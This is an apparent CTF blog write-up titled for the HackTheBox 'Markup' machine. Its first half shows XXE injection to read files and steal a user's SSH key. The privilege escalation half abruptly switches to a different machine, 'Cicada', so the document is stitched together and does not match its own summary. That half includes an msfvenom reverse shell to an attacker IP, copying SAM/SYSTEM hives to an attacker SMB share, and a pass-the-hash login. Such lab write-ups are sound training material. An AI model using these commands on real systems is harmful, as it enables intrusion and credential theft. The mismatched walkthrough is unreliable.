---
title: "HackTheBox - Very Easy - Markup"
date: 2022-03-22 15:42:59 -0700
categories: [CTF,HackTheBox]
tags: [windows, XML External Entities (XXE / XEE), LFI, Winodws PrivEsc, Service Binary Hijacking ]
---

![Markup](/assets/img/ctf/htb/very-easy/markup/1.png)

# Initial Intel
* Difficulty: Very Easy

# tl;dr
<details><summary>Spoilers</summary>
* SSH and a webserver on :80 are active<br/>
* default creds to get into the webapp</br>
* View page source for a username & XXE vector<br/>
* Use Burspuite to intercept and edit the XML sent to the webapp <br/>
* use XXE to LFI the known user's SSH key<br/>
* SSH as user and enumerate C:\Log-Management for an editable .bat file<br/>
* transfer nc over and edit the .bat file to get admin shell
</details>

# Attack Path

## Recon

### Service Enumeration

Let's start off with a basic TCP scan. If we can't find anything we can later run a UDP scan.

```bash
# set host & initiate a standard tcp scan
sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full $markup
```

Looks like SSH and a webserver (TCP 80 & 443) are both available. 


```bash
PORT    STATE SERVICE  REASON          VERSION                                                                                                                                                                           
22/tcp  open  ssh      syn-ack ttl 127 OpenSSH for_Windows_8.1 (protocol 2.0)                                                                                                                                           
80/tcp  open  http     syn-ack ttl 127 Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)                                                                                                                          
|_http-title: MegaShopping                                                                                                                                                                                               
443/tcp open  ssl/http syn-ack ttl 127 Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28) 
```

I don't see any exploits available based off this info. I'll enumerate the webapp next.

#### Webapp Enumeration

Navigating in-browser to the app gets us a login Page. I run ferox buster to enum any directories, pages, or files in the meantime:

![Webapp Login](/assets/img/ctf/htb/very-easy/markup/2.png)

```bash
feroxbuster --url $markup --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do 
```

But this doesn't seem to reveal anything interseting. I also viewed the HTML source for version or other interesting information, but couldn't find anything.

Next thing I'll try is to use default creds. My goto is always admin:password and it works right off the bat.

![Logged in](/assets/img/ctf/htb/very-easy/markup/3.png)

First, I'll walk the app and explore each tab, making sure to view source for each and test any interactive features.

![Order Page](/assets/img/ctf/htb/very-easy/markup/4_0.png)

The order page has the only discernable feature that 'does something' when the form is submitted. A popup appears when any values are entered. This page warrants a closer look by viewing the source:

![Order page source](/assets/img/ctf/htb/very-easy/markup/4.png)

A name is mentioned. I'll note that down for future enumeration.

Futher down in the source we can see that the form is submitting XML data. This could be vulnerable to XML External Entities attackes if the server does not have proper protections in place:

![Order page source - XML](/assets/img/ctf/htb/very-easy/markup/5.png)

### XML External Entity (XXE / XEE) Abuse

Did some reading here: <a href="https://angelica.gitbook.io/hacktricks/pentesting-web/xxe-xee-xml-external-entity" alt='Hacktricks XXE XEE'>Hacktricks XXE / XEE</a>

After launching Burpsuite and starting Intercept:

![Capturing the XML data](/assets/img/ctf/htb/very-easy/markup/6.png)

1. I turned on my proxy in-browser
2. Fill in dummy data
3. Submit 

![Intercept](/assets/img/ctf/htb/very-easy/markup/7.png)

Once we've captured the XML, send it to the repeater for manipulation.

![XXE / XEE Exploit](/assets/img/ctf/htb/very-easy/markup/8.png)

1. The external entity is defined here. NOTE: for Windows paths, forward slashes seem to work, whereas backslashes do not.
2. We need to insert the entity object inside an existing data object. The 'payload' object defined is inserted here with a prefix '&' and a suffix ';'
3. We get LFI of the hosts file, proving we can leverage this exploit further for sensitve files

So, how can we further leverage this vector for a foothold? Let's review some info we've enumerated already:

1. SSH is enabled
2. We have a username *Daniel*
3. We can perform LFI to get sensitive files.

## Foothold

Whenever LFI is possible AND we know SSH is enabled, we should always try to get SSH keys. Let's try to get Daniel's.

![SSH Key](/assets/img/ctf/htb/very-easy/markup/9.png)

Nice, we were able to get their key. Pop that into a local id_rsa file and remember to change the permissions!

```bash
chmod 600 id_rsa

┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]                                                                                                                                                                      
└─$ ssh -i id_rsa daniel@$markup                                                                                                                                                                                         
The authenticity of host '10.129.179.78 (10.129.179.78)' can't be established.                                                                                                                                           
ED25519 key fingerprint is SHA256:v2qVZ0/YBh1AMB/k4lDggvG5dQb+Sy+tURkS2AiYjx4.                                                                                                                                           
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:95: [hashed name]
    ~/.ssh/known_hosts:116: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.179.78' (ED25519) to the list of known hosts.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>
```

Foothold established as user daniel.


## Privilege Escalation

To that end, once of my go-to referencing for pentesting is *Hacktricks*. BOOKMARK IT! NOW! 

There's a section regarding privileged groups that have dangerous permissions. See the link below for the 'Backup Operators' group:

<a href="https://angelica.gitbook.io/hacktricks/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators"  alt="Hacktricks">Hack Tricks - Backup Operators</a>

So let's start with the AD attack section using *diskshadow.exe*

![diskshadow evil-winRM fail](/assets/img/ctf/htb/easy/cicada/4.png)

### Improving Our Foothold

Ugh. *evil-winrm* does its job when getting an initial foothold shell, but it gives too many issues regarding piped output as you can see above. We'll try to get a more stable revshell first.

First, let's start our listener on port 4444:

```bash
sudo rlwrap nc -lvnp 4444
```

Then we'll make our revshell payload using *msfvenom*


```bash
# make sure to replace your LHOST to your $attacker IP and LPORT to your listener IP
┌──(haunter㉿kali)-[~/working/htb/easy/cicada]                                                                                        
└─$ msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=10.10.14.15 LPORT=4444 -f exe -o revshell.exe 
```

Finally, we'll upload the revshell to the $target and execute:


```bash 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> upload revshell.exe 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> .\revshell.exe

```

Now we check the listener and there should be a connection. Running *diskshadow.exe* again shows correct output now.

```bash
listening on [any] 4444 ...             
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.35] 50949
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.
                                                                                                            
C:\Users\emily.oscars.CICADA\Documents>diskshadow.exe                                                       
diskshadow.exe                                        
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  CICADA-DC,  10/20/2025 1:38:38 PM

```

While I was able to get *disksahdow.exe* to launch this time, it still seems broken as it does not seem to take my commands. Not sure if this an intended issue or not, but I went back to the drawing board and found the following attack path for Backup Operators:

<a href="https://www.bordergate.co.uk/backup-operator-privilege-escalation/" alt="Backup Operators Privilege Escalation">Backup Operators - Privilege Escalation</a>

I'll attempt to copy the SAM & SYSTEM files and then dump them on my $attacker locally.

```bash
# make a copy of the SAM file 
reg save hklm\sam c:\Windows\Tasks\SAM

# make a copy of the SYSTEM file
reg save hklm\system c:\Windows\Tasks\SYSTEM

# cd to the folder of the copied files and then transfer via SMB to $attacker
cd c:\windows\tasks\
copy SAM \\10.10.14.15\attacker\SAM
copy SYSTEM \\10.10.14.15\attacker\SYSTEM
```
Now back on my $attacker, I cd into the attacker/ SMB share and try to dump the secrets:

```bash
┌──(haunter㉿kali)-[~/working/htb/easy/cicada/attacker]
└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

![administrator hash](/assets/img/ctf/htb/easy/cicada/5.png)

We get *administrator's* hash. 

## Root / SYSTEM

```bash
evil-winrm -i $cicada -u administrator -H ****************************f341
```
![root.txt flag](/assets/img/ctf/htb/easy/cicada/6.png)

With that, we've rooted Cicada.

# Lessons Learned
* everytime a new user cred is obtained, re-enumerate previously enumerated services, such as SMB.
* LDAP with Bloodhound is a great resource to discover if users belong to any VIP groups. Search for how these privileges can be abused
* evil-winrm can have output piping issues. Use revshell payloads to establish better shells
